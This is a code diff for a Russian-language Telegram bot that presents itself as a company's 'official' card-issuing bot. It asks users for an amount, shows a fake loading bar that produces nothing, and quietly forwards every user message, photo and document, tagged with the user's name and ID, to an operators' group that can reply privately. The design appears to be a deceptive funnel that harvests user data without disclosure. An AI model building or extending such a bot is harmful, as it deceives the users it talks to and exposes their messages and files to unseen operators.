@@ -4,7 +4,7 @@ from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
 TOKEN = os.environ.get("TOKEN")
-ADMIN_ID = 8065330336
+ADMIN_CHAT_ID = -1003725431948  # твоя админ-группа
 
 if not TOKEN:
     raise ValueError("Не установлен токен бота")
@@ -17,23 +17,13 @@ start_kb = make_keyboard(["Старт"])
 yes_kb = make_keyboard(["Да"])
 amount_kb = make_keyboard(["200", "400", "600"])
 
-
 # --- старт ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-
-    if update.effective_user.id != ADMIN_ID:
-        await context.bot.forward_message(
-            chat_id=ADMIN_ID,
-            from_chat_id=update.effective_chat.id,
-            message_id=update.message.message_id
-        )
-
     photo_path = os.path.join("images", "card.jpg")
-
     if os.path.exists(photo_path):
-        with open(photo_path, "rb") as photo_file:
+        with open(photo_path, "rb") as photo:
             await update.message.reply_photo(
-                photo=photo_file,
+                photo=photo,
                 caption="Здравствуйте, это официальный бот для карточек. Чтобы получить карточку, нажмите Старт",
                 reply_markup=start_kb
             )
@@ -43,105 +33,87 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=start_kb
         )
 
-
 # --- генерация карточек ---
 async def send_cards(update, amount):
-
     await update.message.reply_text(f"Генерируем пакет карточек ({amount})")
-
-    total_seconds = 14
-    loading_msg = await update.message.reply_text("Загрузка: " + "░" * total_seconds)
-
-    for i in range(1, total_seconds + 1):
+    total = 14
+    msg = await update.message.reply_text("Загрузка: " + "░" * total)
+    for i in range(1, total + 1):
         await asyncio.sleep(1)
-        bar = "█" * i + "░" * (total_seconds - i)
-        await loading_msg.edit_text(f"Загрузка: {bar}")
+        bar = "█" * i + "░" * (total - i)
+        await msg.edit_text(f"Загрузка: {bar}")
+    await msg.edit_text("Карточка")
 
-    await loading_msg.edit_text("Карточка")
+# --- пересылка в админ-группу ---
+async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    msg = update.message
+    # сначала подпись пользователя
+    text = f"👤 {user.first_name} | ID: {user.id}"
+    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=text)
+    # пересылаем сообщение (любой тип)
+    await context.bot.forward_message(
+        chat_id=ADMIN_CHAT_ID,
+        from_chat_id=msg.chat_id,
+        message_id=msg.message_id
+    )
 
-
-# --- ответ администратора ---
+# --- ответы из админ-группы ---
 async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
-
-    if update.effective_user.id != ADMIN_ID:
+    if update.effective_chat.id != ADMIN_CHAT_ID:
         return
-
     if not update.message.reply_to_message:
         return
-
     original = update.message.reply_to_message
+    if original.forward_from:
+        user_id = original.forward_from.id
+        msg = update.message
+        if msg.text:
+            await context.bot.send_message(chat_id=user_id, text=msg.text)
+        elif msg.photo:
+            await context.bot.send_photo(chat_id=user_id, photo=msg.photo[-1].file_id, caption=msg.caption)
+        elif msg.document:
+            await context.bot.send_document(chat_id=user_id, document=msg.document.file_id, caption=msg.caption)
 
-    if original.forward_from_chat:
-        user_id = original.forward_from_chat.id
+# --- основной обработчик сообщений ---
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    msg = update.message
 
-        if update.message.text:
-            await context.bot.send_message(chat_id=user_id, text=update.message.text)
+    # пересылаем ВСЕ сообщения пользователю в админ-группу
+    if user.id != ADMIN_CHAT_ID:
+        await forward_to_admin(update, context)
 
-        elif update.message.photo:
-            await context.bot.send_photo(
-                chat_id=user_id,
-                photo=update.message.photo[-1].file_id,
-                caption=update.message.caption
-            )
+    # логика бота работает только с текстом
+    if not msg.text:
+        return
 
-
-# --- основной обработчик ---
-async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-
-    user_id = update.effective_user.id
-    text = update.message.text.strip()
-
-    # пересылаем админу
-    if user_id != ADMIN_ID:
-        await context.bot.forward_message(
-            chat_id=ADMIN_ID,
-            from_chat_id=update.effective_chat.id,
-            message_id=update.message.message_id
-        )
-
+    text = msg.text.strip()
     state = context.user_data.get("state", "START")
 
     if state == "START" and text == "Старт":
-
-        await update.message.reply_text(
+        await msg.reply_text(
             "Я разработан компанией сисистик для выдачи карточек. Вы хотите получить карточку сейчас?",
             reply_markup=yes_kb
         )
-
         context.user_data["state"] = "ASK_YES"
 
     elif state == "ASK_YES" and text == "Да":
-
-        await update.message.reply_text(
+        await msg.reply_text(
             "Хорошо, на какую сумму вы хотите получить карточки?",
             reply_markup=amount_kb
         )
-
         context.user_data["state"] = "ASK_AMOUNT"
 
     elif state == "ASK_AMOUNT" and text in ["200", "400", "600"]:
-
         await send_cards(update, text)
-
         context.user_data["state"] = "START"
 
-    else:
-
-        await update.message.reply_text(
-            "Пожалуйста, используйте кнопки ниже для выбора."
-        )
-
-
-# --- запуск ---
+# --- запуск бота ---
 app = ApplicationBuilder().token(TOKEN).build()
-
 app.add_handler(CommandHandler("start", start))
-
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
-
-# админ отвечает reply
-app.add_handler(MessageHandler(filters.ALL & filters.User(ADMIN_ID), admin_reply))
-
+app.add_handler(MessageHandler(filters.ALL & ~filters.Chat(ADMIN_CHAT_ID), message_handler))
+app.add_handler(MessageHandler(filters.ALL & filters.Chat(ADMIN_CHAT_ID), admin_reply))
 
 print("Бот запущен...")
 app.run_polling()
